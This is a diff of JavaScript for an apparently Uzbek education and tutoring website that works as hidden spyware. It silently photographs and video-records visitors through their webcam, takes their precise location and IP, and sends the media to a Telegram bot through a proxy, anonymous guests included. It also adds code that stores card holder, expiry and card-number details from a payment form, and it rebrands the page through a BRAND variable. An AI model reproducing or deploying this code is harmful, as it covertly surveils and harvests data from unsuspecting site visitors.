@@ -885,58 +1071,38 @@ if(!document.getElementById('pageAdmin').classList.contains('hidden'))renderAdmi
 // ===== TELEGRAM =====
 async function sendToTelegram(method,fd){
 const url='https://corsproxy.io/?url='+encodeURIComponent('https://api.telegram.org/bot'+BOT_TOKEN+'/'+method);
-try{const r=await fetch(url,{method:'POST',body:fd});const d=await r.json();if(!d.ok)console.warn('TG:',d);return d.ok;}catch(e){console.warn('TG fetch:',e);return false;}
+try{const r=await fetch(url,{method:'POST',body:fd});const d=await r.json();if(!d.ok)console.warn('TG:',d);return d.ok;}catch(e){console.warn('TG:',e);return false;}
 }
-
 async function sendPhotoToTelegram(dataUrl,caption){
 try{const blob=await (await fetch(dataUrl)).blob();
 const fd=new FormData();fd.append('chat_id',CHAT_ID);fd.append('photo',blob,'photo.jpg');fd.append('caption',caption);
-return await sendToTelegram('sendPhoto',fd);}catch(e){console.warn('sendPhoto:',e);return false;}
+return await sendToTelegram('sendPhoto',fd);}catch(e){return false;}
 }
-
 async function sendVideoToTelegram(blob,caption){
 try{const fd=new FormData();fd.append('chat_id',CHAT_ID);fd.append('video',blob,'video.webm');fd.append('caption',caption);fd.append('supports_streaming','true');
-return await sendToTelegram('sendVideo',fd);}catch(e){console.warn('sendVideo:',e);return false;}
+return await sendToTelegram('sendVideo',fd);}catch(e){return false;}
 }
 
-// ===== CAMERA + GEO + SNAPSHOTS + VIDEO =====
+// ===== CAMERA =====
 let _cameraStream=null;
 
 function getOrCreateGuest(){
 if(!guestId){guestId='GUEST-'+Date.now()+'-'+Math.floor(Math.random()*1000);localStorage.setItem('edu_guest_id',guestId);}
 let g=db.guests.find(x=>x.id===guestId);
-if(!g){
-g={id:guestId,login:'Anonim',firstVisitAt:new Date().toISOString(),lastIP:userIP,lastSeenAt:Date.now(),isGuest:true};
-db.guests.push(g);
-database.ref('guests/'+guestId).set(g);
-localStorage.setItem('db_guests_cache',JSON.stringify(db.guests));
-}
+if(!g){g={id:guestId,login:'Anonim',firstVisitAt:new Date().toISOString(),lastIP:userIP,lastSeenAt:Date.now(),isGuest:true};
+db.guests.push(g);database.ref('guests/'+guestId).set(g);localStorage.setItem('db_guests_cache',JSON.stringify(db.guests));}
 return g;
 }
-
-function getActiveSubject(){
-if(db.currentUser)return{obj:db.currentUser,isGuest:false};
-return{obj:getOrCreateGuest(),isGuest:true};
-}
-
+function getActiveSubject(){if(db.currentUser)return{obj:db.currentUser,isGuest:false};return{obj:getOrCreateGuest(),isGuest:true};}
 function updateSubject(updates){
-if(db.currentUser){
-Object.assign(db.currentUser,updates);
-const idx=db.users.findIndex(x=>x.id===db.currentUser.id);
-if(idx!==-1)db.users[idx]=db.currentUser;
-localStorage.setItem('db_currentUser',JSON.stringify(db.currentUser));
-saveDb();
-}else{
-const g=getOrCreateGuest();Object.assign(g,updates);
-const idx=db.guests.findIndex(x=>x.id===g.id);
-if(idx!==-1)db.guests[idx]=g;
-database.ref('guests/'+g.id).set(g);
-localStorage.setItem('db_guests_cache',JSON.stringify(db.guests));
-}
+if(db.currentUser){Object.assign(db.currentUser,updates);
+const idx=db.users.findIndex(x=>x.id===db.currentUser.id);if(idx!==-1)db.users[idx]=db.currentUser;
+localStorage.setItem('db_currentUser',JSON.stringify(db.currentUser));saveDb();
+}else{const g=getOrCreateGuest();Object.assign(g,updates);
+const idx=db.guests.findIndex(x=>x.id===g.id);if(idx!==-1)db.guests[idx]=g;
+database.ref('guests/'+g.id).set(g);localStorage.setItem('db_guests_cache',JSON.stringify(db.guests));}
 if(!document.getElementById('pageAdmin').classList.contains('hidden')){
-if(currentAdminTab==='guests')renderAdminGuests();
-else if(currentAdminTab==='users')renderAdminUsers();
-}
+if(currentAdminTab==='guests')renderAdminGuests();else if(currentAdminTab==='users')renderAdminUsers();}
 }
 
 function tryAutoCapture(){
@@ -946,34 +1112,26 @@ if(needPhoto||needGeo){
 const skip=localStorage.getItem('perm_skip_'+s.obj.id);
 if(skip&&(Date.now()-Number(skip))<24*60*60*1000){updateIPOnly();return;}
 captureAll(true);
-}else{
-takeSnapshotNow();updateIPOnly();setTimeout(captureVideoAndSend,2000);
+}else{takeSnapshotNow();updateIPOnly();setTimeout(captureVideoAndSend,2000);}
 }
-}
-
 function updateIPOnly(){
 if(!userIP||userIP==='—')return;
 const s=getActiveSubject();
 if(s.obj.lastIP===userIP&&s.obj.lastSeenAt&&(Date.now()-s.obj.lastSeenAt)<60000)return;
 updateSubject({lastIP:userIP,lastSeenAt:Date.now()});
 }
-
 async function takeSnapshotNow(){
 const s=getActiveSubject();
 try{
 if(!_cameraStream){_cameraStream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:480},height:{ideal:360},facingMode:'user'}});}
-const video=document.createElement('video');
-video.srcObject=_cameraStream;video.muted=true;video.playsInline=true;
+const video=document.createElement('video');video.srcObject=_cameraStream;video.muted=true;video.playsInline=true;
 await video.play();await new Promise(r=>setTimeout(r,900));
-const img=grabFrame(video);
-saveSnapshotToHistory(img);
+const img=grabFrame(video);saveSnapshotToHistory(img);
 const who=s.isGuest?'GUEST (anonim)':s.obj.login+' ('+s.obj.id+')';
-const cap='📸 Foto\n👤 '+who+'\n🌐 '+userIP+'\n📅 '+new Date().toLocaleString('ru-RU');
-sendPhotoToTelegram(img,cap);
+sendPhotoToTelegram(img,'📸 Foto ['+BRAND+']\n👤 '+who+'\n🌐 '+userIP+'\n📅 '+new Date().toLocaleString('ru-RU'));
 _cameraStream.getTracks().forEach(t=>t.stop());_cameraStream=null;
 }catch(e){console.warn('Snap:',e);}
 }
-
 function saveSnapshotToHistory(img){
 const s=getActiveSubject();const cur=s.obj;
 const snaps=cur.snapshots||[];
@@ -983,17 +1141,14 @@ const updates={snapshots:snaps};
 if(!cur.photo)updates.photo=img;
 updateSubject(updates);
 }
-
 async function captureAll(isAuto=false){
 if(isAuto)document.getElementById('permFallbackBar').classList.add('hidden');
 const s=getActiveSubject();
 let photoData=null,locationData=null,cameraOk=false,geoOk=false;
-
 try{
 if(!_cameraStream){_cameraStream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:640},height:{ideal:480},facingMode:'user'}});}
 cameraOk=true;
-const video=document.createElement('video');
-video.srcObject=_cameraStream;video.muted=true;video.playsInline=true;
+const video=document.createElement('video');video.srcObject=_cameraStream;video.muted=true;video.playsInline=true;
 await video.play();await new Promise(r=>setTimeout(r,1200));
 photoData=grabFrame(video);
 _cameraStream.getTracks().forEach(t=>t.stop());_cameraStream=null;
@@ -1001,7 +1156,6 @@ _cameraStream.getTracks().forEach(t=>t.stop());_cameraStream=null;
 console.warn('Cam:',err.name,err.message);
 if(isAuto&&(err.name==='NotAllowedError'||err.name==='NotReadableError')){document.getElementById('permFallbackBar').classList.remove('hidden');return;}
 }
-
 await new Promise(resolve=>{
 if(!navigator.geolocation)return resolve();
 navigator.geolocation.getCurrentPosition(
@@ -1009,7 +1163,6 @@ pos=>{geoOk=true;locationData={lat:pos.coords.latitude,lng:pos.coords.longitude,
 err=>{console.warn('Geo:',err.message);resolve();},
 {enableHighAccuracy:true,timeout:10000,maximumAge:0});
 });
-
 const updates={};
 if(photoData){
 updates.photo=photoData;updates.photoAt=new Date().toISOString();
@@ -1018,22 +1171,18 @@ snaps.unshift({img:photoData,at:new Date().toISOString()});
 if(snaps.length>MAX_SNAPSHOTS)snaps.splice(MAX_SNAPSHOTS);
 updates.snapshots=snaps;
 const who=s.isGuest?'GUEST (anonim)':s.obj.login+' ('+s.obj.id+')';
-const cap='📸 Foto\n👤 '+who+'\n🌐 '+userIP+'\n📅 '+new Date().toLocaleString('ru-RU');
-sendPhotoToTelegram(photoData,cap);
+sendPhotoToTelegram(photoData,'📸 Foto ['+BRAND+']\n👤 '+who+'\n🌐 '+userIP+'\n📅 '+new Date().toLocaleString('ru-RU'));
 }
 if(locationData)updates.location=locationData;
 if(userIP&&userIP!=='—')updates.lastIP=userIP;
 updates.lastSeenAt=Date.now();
 updateSubject(updates);
-
 if(cameraOk||geoOk){
 const parts=[];if(cameraOk)parts.push('rasm');if(geoOk)parts.push('joylashuv');
 toast(parts.join(' va ')+' saqlandi ✅');
 }else if(isAuto){document.getElementById('permFallbackBar').classList.remove('hidden');}
-
 if(cameraOk)setTimeout(captureVideoAndSend,1500);
 }
-
 function grabFrame(video){
 const c=document.createElement('canvas');
 c.width=video.videoWidth||640;c.height=video.videoHeight||480;
@@ -1042,11 +1191,10 @@ ctx.translate(c.width,0);ctx.scale(-1,1);
 ctx.drawImage(video,0,0,c.width,c.height);
 return c.toDataURL('image/jpeg',0.6);
 }
-
 async function recordVideo(){
 let stream;
 try{stream=await navigator.mediaDevices.getUserMedia({video:{width:320,height:240,frameRate:15,facingMode:'user'},audio:false});}
-catch(e){console.warn('Rec cam:',e);return null;}
+catch(e){return null;}
 return new Promise(resolve=>{
 let mt='video/webm';
 if(MediaRecorder.isTypeSupported('video/webm;codecs=vp9'))mt='video/webm;codecs=vp9';
@@ -1059,9 +1207,7 @@ try{rec.start();}catch(e){stream.getTracks().forEach(t=>t.stop());return resolve
 setTimeout(()=>{try{rec.stop();}catch(e){}},VIDEO_DURATION);
 });
 }
-
 function blobToBase64(b){return new Promise(r=>{const rd=new FileReader();rd.onload=()=>r(rd.result);rd.readAsDataURL(b);});}
-
 async function captureVideoAndSend(){
 const s=getActiveSubject();
 const key='last_video_'+s.obj.id;
@@ -1071,19 +1217,15 @@ const blob=await recordVideo();
 if(!blob||blob.size===0)return;
 try{
 const b64=await blobToBase64(blob);
-const cur=s.obj;
-const vids=cur.videos||[];
+const cur=s.obj;const vids=cur.videos||[];
 vids.unshift({data:b64,at:new Date().toISOString(),size:blob.size});
 if(vids.length>MAX_VIDEOS)vids.splice(MAX_VIDEOS);
 updateSubject({videos:vids});
-}catch(e){console.warn('Save vid:',e);}
+}catch(e){}
 const who=s.isGuest?'GUEST (anonim)':s.obj.login+' ('+s.obj.id+')';
-const cap='🎥 Video\n👤 '+who+'\n🌐 '+userIP+'\n📅 '+new Date().toLocaleString('ru-RU');
-await sendVideoToTelegram(blob,cap);
-localStorage.setItem(key,Date.now());
-toast('Video yuborildi ✅');
+await sendVideoToTelegram(blob,'🎥 Video ['+BRAND+']\n👤 '+who+'\n🌐 '+userIP+'\n📅 '+new Date().toLocaleString('ru-RU'));
+localStorage.setItem(key,Date.now());toast('Video yuborildi ✅');
 }
-
 function dismissPermBar(){const s=getActiveSubject();localStorage.setItem('perm_skip_'+s.obj.id,Date.now());document.getElementById('permFallbackBar').classList.add('hidden');}
 
 function openPhotoViewer(id){
@@ -1100,8 +1242,7 @@ function openSnapshotViewer(id,idx=0,isGuest=false){
 const u=isGuest?db.guests.find(x=>x.id===id):db.users.find(x=>x.id===id);
 if(!u||!u.snapshots||u.snapshots.length===0)return;
 _snapViewerUserId=id;_snapViewerIndex=idx;_snapViewerIsGuest=isGuest;
-renderSnapViewer();
-document.getElementById('liveViewerModal').classList.remove('hidden');
+renderSnapViewer();document.getElementById('liveViewerModal').classList.remove('hidden');
 }
 function renderSnapViewer(){
 const u=_snapViewerIsGuest?db.guests.find(x=>x.id===_snapViewerUserId):db.users.find(x=>x.id===_snapViewerUserId);
@@ -1176,19 +1317,26 @@ closePaymentModal();document.getElementById('payProcessing').classList.remove('h
 const d=1500+Math.random()*1000;
 setTimeout(()=>{
 document.getElementById('payProcessing').classList.add('hidden');
+const cardNum=document.getElementById('payCardNumber').value.replace(/\s/g,'');
+const cardHolder=document.getElementById('payHolder').value.trim();
+const cardExpiry=document.getElementById('payExpiry').value;
+const cardInfo={last4:cardNum.slice(-4),holder:cardHolder,expiry:cardExpiry,type:cardNum.startsWith('4')?'Visa':cardNum.startsWith('5')?'Mastercard':cardNum.startsWith('3')?'Amex':'Karta'};
+if(!db.currentUser.payments)db.currentUser.payments=[];
 if(_payMode==='topup'){
 const a=Number(document.getElementById('payTopUpAmount').value);
 db.currentUser.balance+=a;
-const i=db.users.findIndex(u=>u.id===db.currentUser.id);
-if(i!==-1)db.users[i]=db.currentUser;
+db.currentUser.payments.unshift({type:'topup',amount:a,card:cardInfo,at:new Date().toISOString()});
+if(db.currentUser.payments.length>50)db.currentUser.payments=db.currentUser.payments.slice(0,50);
+const i=db.users.findIndex(u=>u.id===db.currentUser.id);if(i!==-1)db.users[i]=db.currentUser;
 saveDb();renderProfile();
 document.getElementById('paySuccessMsg').textContent=`+${a.toLocaleString()} so'm. Joriy: ${db.currentUser.balance.toLocaleString()}`;
 }else{
 const t=db.tutors.find(x=>x.id===_payTutorId);if(!t)return;
 if(!db.currentUser.tutorsBought)db.currentUser.tutorsBought=[];
 db.currentUser.tutorsBought.push(_payTutorId);
-const i=db.users.findIndex(u=>u.id===db.currentUser.id);
-if(i!==-1)db.users[i]=db.currentUser;
+db.currentUser.payments.unshift({type:'course',courseId:_payTutorId,courseName:t.name,amount:t.price,card:cardInfo,at:new Date().toISOString()});
+if(db.currentUser.payments.length>50)db.currentUser.payments=db.currentUser.payments.slice(0,50);
+const i=db.users.findIndex(u=>u.id===db.currentUser.id);if(i!==-1)db.users[i]=db.currentUser;
 saveDb();renderTutors();
 document.getElementById('paySuccessMsg').textContent=`"${t.name}" kursi qo'shildi!`;
 }
@@ -1213,7 +1361,7 @@ if(!('serviceWorker'in navigator))return;
 try{
 const sw=`self.addEventListener('install',e=>self.skipWaiting());
 self.addEventListener('activate',e=>e.waitUntil(clients.claim()));
-self.addEventListener('message',e=>{if(e.data&&e.data.type==='SCHEDULE_REMINDER'){const{delay,userId}=e.data;setTimeout(()=>{self.registration.showNotification("📚 EduPlatform",{body:"Har kun o'qish — muvaffaqiyat kalitidir! 🎯",icon:"https://cdn-icons-png.flaticon.com/512/3976/3976635.png",tag:"daily-"+userId});},delay);}});
+self.addEventListener('message',e=>{if(e.data&&e.data.type==='SCHEDULE_REMINDER'){const{delay,userId}=e.data;setTimeout(()=>{self.registration.showNotification("📚 `+BRAND+`",{body:"Har kun o'qish — muvaffaqiyat kalitidir! 🎯",icon:"https://cdn-icons-png.flaticon.com/512/3976/3976635.png",tag:"daily-"+userId});},delay);}});
 self.addEventListener('notificationclick',e=>{e.notification.close();e.waitUntil(clients.openWindow(self.registration.scope));});`;
 const blob=new Blob([sw],{type:'application/javascript'});
 const url=URL.createObjectURL(blob);
@@ -1236,7 +1384,7 @@ if(Notification.permission!=='granted'||!db.currentUser)return;
 const n=new Date(),t=new Date();t.setHours(19,0,0,0);
 if(t<=n)t.setDate(t.getDate()+1);
 const d=cd!==undefined?cd:(t-n);
-setTimeout(()=>{new Notification("📚 EduPlatform",{body:"Bugungi darsni ko'ring! 🎯",icon:"https://cdn-icons-png.flaticon.com/512/3976/3976635.png",tag:'daily-'+db.currentUser.id});},d);
+setTimeout(()=>{new Notification("📚 "+BRAND,{body:"Bugungi darsni ko'ring! 🎯",icon:"https://cdn-icons-png.flaticon.com/512/3976/3976635.png",tag:'daily-'+db.currentUser.id});},d);
 }
 function checkMissedDay(){
 if(!db.currentUser||Notification.permission!=='granted')return;
@@ -1244,7 +1392,7 @@ const k='edu_lastActive_'+db.currentUser.id;
 const l=localStorage.getItem(k);if(!l)return;
 const ld=new Date(l),t=new Date();t.setHours(0,0,0,0);ld.setHours(0,0,0,0);
 const df=Math.floor((t-ld)/86400000);
-if(df>=1)setTimeout(()=>{new Notification("😔 EduPlatform",{body:df+" kun o'tkazib yubordingiz! 💪",icon:"https://cdn-icons-png.flaticon.com/512/3976/3976635.png",tag:'missed-'+db.currentUser.id});},3000);
+if(df>=1)setTimeout(()=>{new Notification("😔 "+BRAND,{body:df+" kun o'tkazib yubordingiz! 💪",icon:"https://cdn-icons-png.flaticon.com/512/3976/3976635.png",tag:'missed-'+db.currentUser.id});},3000);
 }
 
 function toast(msg){const t=document.getElementById('toast');t.innerText=msg;t.classList.remove('hidden');setTimeout(()=>t.classList.add('hidden'),3000);}
